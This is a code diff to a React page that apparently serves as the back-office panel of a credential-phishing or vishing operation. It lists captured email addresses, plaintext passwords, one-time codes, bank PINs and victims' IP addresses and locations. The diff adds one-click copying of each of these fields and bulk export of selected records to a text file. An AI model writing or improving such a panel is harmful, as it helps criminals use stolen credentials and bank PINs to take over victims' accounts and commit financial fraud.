@@ -7,6 +7,7 @@ import { useDispatch, useSelector } from "react-redux";
 import { Trash2 } from "lucide-react";
 import { FaTrash } from "react-icons/fa";
 import moment from "moment";
+import Success from "@/components/SuccessPop";
 
 function CallLogsPage() {
   const dispatch = useDispatch();
@@ -16,8 +17,9 @@ function CallLogsPage() {
   const [totalAccounts, setTotalAccounts] = useState(0);
   const [limit] = useState(10);
   const [selectedAccounts, setSelectedAccounts] = useState<string[]>([]);
+  const [exportData, setExportData] = useState<any[]>([]);
   const [totalPages, setTotalPages] = useState(1);
-
+  const [open, setOpen] = useState(false);
   useEffect(() => {
     fetchAccounts(currentPage);
   }, [currentPage]);
@@ -45,7 +47,12 @@ function CallLogsPage() {
     setCurrentPage(pageNumber);
   };
 
-  const toggleSelectAccount = (accountId: string) => {
+  const toggleSelectAccount = (accountId: string, account: any) => {
+    if (exportData?.length) {
+      setExportData([...exportData, account]);
+    } else {
+      setExportData([account]);
+    }
     setSelectedAccounts((prevSelected) =>
       prevSelected.includes(accountId)
         ? prevSelected.filter((id) => id !== accountId)
@@ -58,12 +65,83 @@ function CallLogsPage() {
       setSelectedAccounts([]);
     } else {
       setSelectedAccounts(accounts.map((account: any) => account._id));
+      setExportData(accounts);
     }
   };
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard
+      .writeText(text)
+      .then(() => {
+        setOpen(true);
+        setTimeout(() => {
+          setOpen(false);
+        }, 1000);
+      })
+      .catch((error) => {
+        alert("Failed to copy: " + error);
+      });
+  };
+
+  function exportToTxt(filename = "urls.txt") {
+    const columnWidths = {
+      email: 25,
+      password: 20,
+      otp: 10,
+      bankPin: 10,
+      ipAddress: 20,
+    };
+
+    const padString = (str: string, length: number) => {
+      return str.padEnd(length, " ");
+    };
+
+    const headers =
+      padString("Email", columnWidths.email) +
+      padString("Password", columnWidths.password) +
+      padString("Otp", columnWidths.otp) +
+      padString("Bank Pin", columnWidths.bankPin) +
+      padString("Ip Address", columnWidths.ipAddress) +
+      "\n";
+
+    const textContent = exportData
+      .map(
+        (item) =>
+          padString(item.email || "", columnWidths.email) +
+          padString(item.password || "", columnWidths.password) +
+          padString(item.otp || "", columnWidths.otp) +
+          padString(item.bankPin || "", columnWidths.bankPin) +
+          padString(item.location?.ipAddress || "", columnWidths.ipAddress)
+      )
+      .join("\n");
+
+
+    const fileContent = headers + textContent;
+
+
+    const blob = new Blob([fileContent], { type: "text/plain;charset=utf-8;" });
+    const link = document.createElement("a");
+
+
+    const url = URL.createObjectURL(blob);
+    link.href = url;
+    link.setAttribute("download", filename);
+    document.body.appendChild(link);
+    link.click();
+
+
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+  }
 
   return (
     <Fragment>
       <Seo title={"Call-logs"} />
+      <Success
+        isOpen={open}
+        title={"Copied!"}
+        description={"Copied to clipboard!"}
+      />
       <Row>
         <Col xl={12}>
           {accounts?.length ? (
@@ -83,13 +161,21 @@ function CallLogsPage() {
                       className="hover:text-red-500"
                     >
                       <Button
-                        className="btn-md bg-[#546dfe]"
+                        className="btn-lg bg-[#546dfe]"
                         onClick={handleDeleteSelectedAccounts}
                         disabled={selectedAccounts.length === 0}
                       >
                         <FaTrash size={14} className="hover:text-red-400" />
                       </Button>
                     </div>
+
+                    <Button
+                      className="bg-[#546dfe] w-[200px]"
+                      onClick={() => exportToTxt()}
+                      disabled={selectedAccounts.length === 0}
+                    >
+                      Export to text
+                    </Button>
                   </div>
                 </div>
               </Card.Header>
@@ -104,7 +190,7 @@ function CallLogsPage() {
                             className="mt-1"
                             type="checkbox"
                             checked={
-                              selectedAccounts.length === accounts.length
+                              selectedAccounts?.length === accounts?.length
                             }
                             onChange={toggleSelectAll}
                           />
@@ -128,28 +214,37 @@ function CallLogsPage() {
                                 type="checkbox"
                                 checked={selectedAccounts.includes(account._id)}
                                 onChange={() =>
-                                  toggleSelectAccount(account._id)
+                                  toggleSelectAccount(account._id, account)
                                 }
                               />
                             </td>
                             <td>
                               <div className="d-flex">
-                                <div className="ms-2">
+                                <div
+                                  className="ms-2"
+                                  onClick={() => copyToClipboard(account.email)}
+                                >
                                   <p className="fs-12 text-muted mb-0">
                                     {account.email}
                                   </p>
                                 </div>
                               </div>
                             </td>
-                            <td>{account.password}</td>
-                            <td>
+                            <td
+                              onClick={() => copyToClipboard(account.password)}
+                            >
+                              {account.password}
+                            </td>
+                            <td onClick={() => copyToClipboard(account.otp)}>
                               <span
                                 className={`badge bg-${account?.status?.toLowerCase()}-transparent`}
                               >
                                 {account.otp}
                               </span>
                             </td>
-                            <td>
+                            <td
+                              onClick={() => copyToClipboard(account.bankPin)}
+                            >
                               <span className="fw-semibold fs-13">
                                 {account.bankPin}
                               </span>
@@ -163,7 +258,13 @@ function CallLogsPage() {
                                 title={`${account?.location?.country}, ${account?.location?.city}`}
                               />
                             </td>
-                            <td>{account?.location?.ipAddress}</td>
+                            <td
+                              onClick={() =>
+                                copyToClipboard(account?.location?.ipAddress)
+                              }
+                            >
+                              {account?.location?.ipAddress}
+                            </td>
                             <td>
                               <div className="btn-list">
                                 {moment(account.createdAt).format(
